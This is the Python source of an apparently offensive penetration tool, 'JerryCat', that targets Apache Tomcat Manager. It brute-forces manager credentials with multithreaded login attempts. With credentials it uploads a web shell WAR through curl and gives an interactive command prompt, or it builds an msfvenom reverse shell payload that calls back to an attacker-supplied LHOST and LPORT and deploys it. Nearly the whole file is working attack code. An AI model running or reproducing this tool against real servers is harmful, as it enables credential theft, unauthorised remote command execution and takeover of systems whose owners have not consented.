import argparse
import glob
import os.path
import random
import shutil
import signal
import re
import string
import subprocess
import sys
import concurrent.futures
from zipfile import ZipFile

import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

from rich.console import Console
from rich import print
from rich.text import Text

import core.utils
from core.Output import Output

# Global variable to access state of args and my single instance of my class output (yes, not the cleanest way)
global args
global output


# banner of the project
def banner() -> str:
    return '''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠞⢛⣩⡽⠿⠛⠛⠷⣄⠀⠀
⠀⡷⢶⣶⡶⠶⠤⠤⢤⣄⣀⣀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠈⠙⢿⣶⣄⠀⠀⠀⠀⠀⠀⢀⣴⠟⢉⣤⠾⠋⠁⠀⠀⠀⠀⠀⠘⣷⠀
⠀ ⠀⠈⠻⢶⣄⠀⠀⠀⠀⠉⠉⠛⠲⠦⣤⣀⠀⠉⠙⠻⢶⣦⣍⣻⣿⣦⡀⠀⢀⣴⠟⢁⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇
⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢲⣤⣀⣀⣈⣻⣿⣿⠎⠻⣤⠟⠁⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⢀⣠⡴⠶⠛⠋⠉⠉⠁⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⠀⢀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⢀⣠⠀⠀⠀⠀⠀⠀⠀⢰⠃
⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣾⣀⣀⣀⣤⠟⠃⠀⠀⠀⠀⠀⠀⢠⡏⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⠛⠛⠻⠂⠀⠀⠀⠀⠀⠈⢉⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢻⡿⣶⣄⠀⠀⠀⠀⠀⠀⢠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠈⠛⠀⢰⡄⣶⠀⠀⠀⢀⣤⣶⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⠈⢿⣤⣀⣀⣀⣀⣤⠞⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡶⢦⣄⡈⣷⣿⣀⣠⠶⠋⠻⠿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣦⠬⠽⠟⠛⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠤⢴⠤⣤⣄⣀⣀⣴⣿⠛⠻⢦⣹⢿⣿⣿⣿⣿⣄⠀⢀⣰⠇⠀⣀⣀⣀⣤⣤⠤⠴⠶⠶⢶⠟⠒⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀  ⠀⠀⠀⢸⣿⣿⣿⣿⣾⣿⡿⢿⡿⠛⢠⣬⣿⣿⣿⣿⣯⣭⣭⣤⣤⣤⣤⣴⣤⣴⣏⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠸⠋⠉⠉⠉⠉⠙⢿⣿⣿⣷⣬⣷⡈⣧⣄⣀⠹⣧⠀⠀⡟⢹⣦⣄⣴⡟⠁⢀⣀⣀⠙⢦⡀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣼⠋⠉⠉⠛⣿⠿⣯⣿⣯⣗⣼⣷⣦⣿⣿⡿⠿⠾⠿⠿⠭⣍⣉⡉⠛⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⡁⠀⠀⠀⢠⡏⢀⡴⠋⠁⠀⠀⠀⢈⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢦⣸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀⠀⣠⡾⣷⠏⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⠷⠤⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⡼⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⢰⣷⠃⠀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠉⠙⠒⠒⠒⠒⠒⠒⠒⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠁⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                                                  JerryCat By Anh4ckin3 & Talace

'''


# common username list of tomcat's most common username - serve as backup if no user list
common_username: list[str] = [
    "tomcat",
    "manager",
    "role1",
    "root",
    "admin"
]

# Tomcat class
class Tomcat:
    def __init__(self, url: str):
        self.url = url

    def login(self, username, password):
        auth = HTTPBasicAuth(username, password)
        response = requests.get(f"{self.url}/manager/html", auth=auth)
        if response.status_code == 200:
            output.message(state="success", description=f"{username}:{password}", url="")
            return username, password
        else:
            output.message(state="failed", description=f"{username}:{password}", url="", verbose=True)
            return None


class UnauthenticatedAttack(Tomcat):
    def __init__(self, url: str, wordlist: str, userlist: str):
        super().__init__(url)
        self.userlist = userlist
        self.wordlist = wordlist

    def brute_force(self):
        if self.userlist is None:
            self.userlist = common_username
        else:
            with open(self.userlist, 'r') as file:
                self.userlist = file.read().splitlines()

        output.message(state="ongoing", description="Brute force is running...", url="")

        with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as open_wordlist:
            passwords = open_wordlist.readlines()

        with concurrent.futures.ThreadPoolExecutor() as executor:
            tasks = []
            for username in self.userlist:
                for password in passwords:
                    password = password.strip()
                    task = executor.submit(super().login, username, password)
                    tasks.append(task)

            credentials = []

            for future in concurrent.futures.as_completed(tasks):
                result = future.result()

                if result:
                    new_credentials = {'username': result[0], 'password': result[1]}
                    credentials.append(new_credentials)

            output.message(state="success", description="Brute force done!", url="")

            if credentials:
                return credentials

        return False


class AuthenticatedAttack(Tomcat):
    def __init__(self, url: str, username: str, password: str):
        super().__init__(url)
        self.username = username
        self.password = password

    def upload(self):

        match args.mode:
            case "exec":
                response = requests.get(url=f"{self.url}/web_shell/index.jsp")

                if response.status_code != 200:
                    command = f"curl --upload-file resources/web_shell.war -u '{self.username}:{self.password}' '{self.url}/manager/text/deploy?path=/web_shell'"
                    subprocess.run(command, shell=True, check=True, capture_output=True)

                response = self.execute_webshell_cmd(cmd="whoami")

                if response:
                    output.message(state="ongoing", description="Spawning webshell...", url="")
                else:
                    output.message(state="failed", description="An error occur with the webshell", url="")
                    output.message(state="exit", description="Jobs finished ? Jobs not finished", url="")
                    return

                cmd = ''

                while cmd != "exit":
                    print("[bold red]Jerrycat[/] > ", end="")
                    cmd = input()

                    if cmd != "":
                        response = self.execute_webshell_cmd(cmd=cmd)
                        if response != "":
                            output.webshell_response(response, url="/web_shell")

            case "reverse":

                filename = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))

                response = requests.get(url=f"{self.url}/reverse")

                output.message(state="settings", description=f"LHOST: {args.lhost} - LPORT: {args.lport}", url="")

                if response.status_code != 200:

                    # generate part

                    filename = core.utils.generate_payload(filename=filename, lhost=args.lhost, lport=args.lport)

                    # deploy part

                    command = f"curl --upload-file resources/{filename}.war -u '{self.username}:{self.password}' '{self.url}/manager/text/deploy?path=/reverse'"
                    subprocess.run(command, shell=True, check=True, capture_output=True)
                    output.message(state="success", description="Uploading revershell", url="")

                    output.message(state="info", description=f"Run this cmd : nc -nlvp {args.lport}",
                                   url="")

                    print("[bold red]Jerrycat[/] > Type [bold yellow]'Run'[/] when your netcat is ready")
                    print("[bold red]Jerrycat[/] > ", end="")
                    is_netcat_ready = input()

                    while is_netcat_ready.lower() != "run":
                        print("[bold red]Jerrycat[/] > ", end="")
                        is_netcat_ready = input()

                    output.message(state="success", description="Send revershell", url="")
                    response = requests.get(url=f"{self.url}/reverse/")
                    if response.status_code == 200:
                        output.message(state="exit", description="See you next time!", url="")
                    else:
                        output.message(state="error", description=f"Oups.. seems we have an error {response.status_code} here", url="")

    def execute_webshell_cmd(self, cmd: str):
        # Send the GET request to the web shell
        response = requests.get(f"{self.url}/web_shell/index.jsp?cmd={cmd}")

        pre_content = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)

        pre_content = re.sub(r'</?br\s*/?>', '\n', pre_content.group(1), flags=re.IGNORECASE)

        return pre_content


def main():
    global output, args

    # listen for CTRL+C
    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(
        output.message(state="exit", description="See you next time!", clear_before=True)
    ))

    parser = argparse.ArgumentParser(description="Jerrycat the good guy !")

    # choose mode
    parser.add_argument('mode', metavar='MODE', type=str, choices=['brute', 'exec', 'reverse'],
                        help="Mode: brute, exec, or reverse")

    # url
    parser.add_argument('url', metavar='URL', type=str, help='URL of the tomcat app')

    parser.add_argument('-u', '--user', dest='user', help='tomcat user')
    parser.add_argument('-p', '--password', dest='password', help='tomcat user password')

    parser.add_argument("-v", "--verbose", action="store_true", default=False, help='Output all logs')
    parser.add_argument("--payload", help='Path of your payload [webshell, reverseshell]')

    # Brute mode
    brute_mode = parser.add_argument_group("Brute Options")
    brute_mode.add_argument('-P', '--password-list', dest='wordlist', help='path on your own wordlist')
    brute_mode.add_argument('-U', '--user-list', dest='userlist', help='User list ( default tomcat )')

    # exec mode - no specific option yet
    webshell_mode = parser.add_argument_group("Command execution Options")

    # reverse shell mode - no specific option yet
    reverse_mode = parser.add_argument_group("reverse shell Options")
    parser.add_argument('--lhost', dest='lhost', help='LHOST for reverse shell')
    parser.add_argument('--lport', dest='lport', help='LPORT for reverse shell')

    args = parser.parse_args()

    # instance new class
    output = Output(args=args)

    # banner draw of the tool
    print(banner())

    output.header()

    tomcat_instance = Tomcat(url=args.url)

    #if Version(tomcat_instance.version_detection()) < Version("10"):
    #   # make something with it later
    #    pass

    binary_msfvenom = "msfvenom"
    msfvenom_path = shutil.which(binary_msfvenom)

    binary_curl = "curl"
    curl_path = shutil.which(binary_curl)

    if msfvenom_path is None:
        output.message("error", f"{binary_msfvenom} is not installed", url="")
        return

    if curl_path is None:
        output.message("error", f"{binary_curl} is not installed", url="")
        return

    args.url = args.url.rstrip("/")

    if args.user and args.password:
        core.utils.version_detection(url=args.url, username=args.user, password=args.password, output=output)

    # switch for mode
    match args.mode:
        # settings for brute mode
        case 'brute':
            if not args.url:
                parser.error("Url argument are require for this mode.")
            else:
                output.message("success", "Mode Brute selected", url="")

                if not args.wordlist:
                    args.wordlist = 'resources/password-list-common-tomcat.txt'

                tomcat_instance = UnauthenticatedAttack(url=args.url, wordlist=args.wordlist, userlist=args.userlist)
                credentials_found = tomcat_instance.brute_force()

                if not credentials_found:
                    output.message("failed", f"No user or password is matching ! :(", "")

        # settings for exec mode
        case 'exec':
            if not all([args.url, args.user, args.password]):
                parser.error(" url, -u, -p arguments are requires for this mode.")
            else:
                output.message("success", "Mode Webshell selected", "")
                webshell = AuthenticatedAttack(url=args.url, username=args.user, password=args.password)
                webshell.login(username=args.user, password=args.password)
                webshell.upload()

        # settings for reverse mode
        case 'reverse':
            if not all([args.url, args.user, args.password, args.lhost, args.lport]):
                parser.error(" -u, -p, --lhost, --lport arguments are requires for this mode.")
            else:
                output.message("success", "Mode Reverse shell selected", "")
                revereshell = AuthenticatedAttack(url=args.url, username=args.user, password=args.password)
                revereshell.login(username=args.user, password=args.password)
                revereshell.upload()


if __name__ == "__main__":
    main()
